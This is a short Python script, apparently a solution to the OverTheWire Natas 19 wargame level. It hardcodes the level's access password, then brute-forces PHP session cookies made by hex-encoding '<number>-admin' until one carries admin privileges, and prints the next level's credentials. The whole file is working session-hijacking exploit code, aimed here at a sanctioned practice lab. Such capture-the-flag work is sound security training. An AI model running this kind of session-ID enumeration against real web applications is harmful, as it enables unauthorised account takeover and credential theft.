import requests as req

url = "http://natas19.natas.labs.overthewire.org/index.php?username=admin&password=admin&Submit=Login"
password19 = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

def set_cookie(value):
	return(dict(PHPSESSID=''.join([hex(ord(i))[2:] for i in "%i-admin" % value])))

if __name__ == '__main__':
	for val in range(1, 641):
		cookies = set_cookie(val)
		r = req.post(url=url, cookies=cookies, auth=('natas19', password19))
		if not val % 10:
			print("\rChecked %s sessions..." % val, end="")

		if r.text.count("You are an admin."):
			print()
			i1 = r.text.index("Password: ")
			i2 = r.text[i1:].index("</pre>")+i1
			creds = r.text[i1:i2].replace("Password: ", "natas20:")
			print("-" * int(len(password19)/2+5) + "Have fun" + "-" * int(len(password19)/2+5))
			print("Creds: { %s }" % creds)
			break